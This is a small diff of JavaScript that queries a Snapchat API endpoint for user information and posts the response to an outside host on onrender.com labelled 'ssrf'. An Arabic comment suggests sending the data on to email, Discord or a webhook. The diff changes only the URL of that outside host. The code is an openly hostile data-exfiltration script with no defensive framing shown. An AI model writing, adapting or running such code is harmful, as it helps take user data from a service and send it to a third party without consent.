@@ -17,7 +17,7 @@ fetch("https://gcp.api.snapchat.com/gfg/?op=FetchUserInfoQuery", {
   document.body.innerHTML = "<pre>" + data + "</pre>";
 
   // أو ترسلها لبريدك/Discord/Webhook
-  fetch("https://ssrf-52rk.onrender.com/ssrf/scan", {
+  fetch("https://ssrf-52rk.onrender.com", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ snapchat_response: data })
